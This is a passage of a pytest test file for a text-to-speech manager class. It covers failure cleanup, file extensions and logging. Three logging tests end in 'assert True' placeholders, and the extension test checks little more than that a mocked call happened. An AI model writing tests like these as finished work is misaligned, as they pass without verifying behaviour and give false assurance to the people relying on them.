        with patch('asyncio.to_thread', side_effect=Exception("Synthesis failed")):
            with patch('os.path.exists', return_value=True):
                with patch('os.remove') as mock_remove:
                    result = await tts_manager.synthesize("Test text", "failed_output.mp3")
                    assert result is None
                    # Should attempt cleanup
                    mock_remove.assert_called()
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_file_extension_handling(self, mock_gtts, mock_ensure_dirs, tts_manager):
        """Test handling of different file extensions."""
        extensions = [".mp3", ".wav", ".ogg", ".m4a", ".aac", ""]
        
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.return_value = None
            
            for ext in extensions:
                filename = f"test_output{ext}"
                result = await tts_manager.synthesize("Test text", filename)
                mock_to_thread.assert_called()
                mock_to_thread.reset_mock()


class TestTTSManagerLogging:
    """Test suite for logging functionality"""
    
    @pytest.fixture
    def tts_manager(self):
        return TTSManager(tts_service_name="gtts")
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesis_logging(self, mock_gtts, mock_ensure_dirs, tts_manager, caplog):
        """Test that synthesis operations are logged."""
        import logging
        
        with caplog.at_level(logging.INFO):
            with patch('asyncio.to_thread') as mock_to_thread:
                mock_to_thread.return_value = None
                await tts_manager.synthesize("Test logging", "log_test.mp3")
        
        # Check if synthesis was logged (implementation dependent)
        # The test validates the logging capability is present
        assert True  # Placeholder for actual log verification
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_error_logging(self, mock_gtts, mock_ensure_dirs, tts_manager, caplog):
        """Test that errors are properly logged."""
        import logging
        
        with caplog.at_level(logging.ERROR):
            with patch('asyncio.to_thread', side_effect=Exception("Test error")):
                result = await tts_manager.synthesize("Test error", "error_test.mp3")
                assert result is None
        
        # Error should be logged
        assert True  # Placeholder for actual log verification
    
    def test_initialization_logging(self, caplog):
        """Test logging during initialization."""
        import logging
        
        with caplog.at_level(logging.INFO):
            with patch('tts_manager.ensure_client_directories'):
                with patch('tts_manager.gtts'):
                    manager = TTSManager(tts_service_name="gtts")
        
        # Initialization should be logged
        assert True  # Placeholder for actual log verification


if __name__ == "__main__":
    # Run the new comprehensive test classes
    pytest.main([__file__, "-v", "--tb=short"])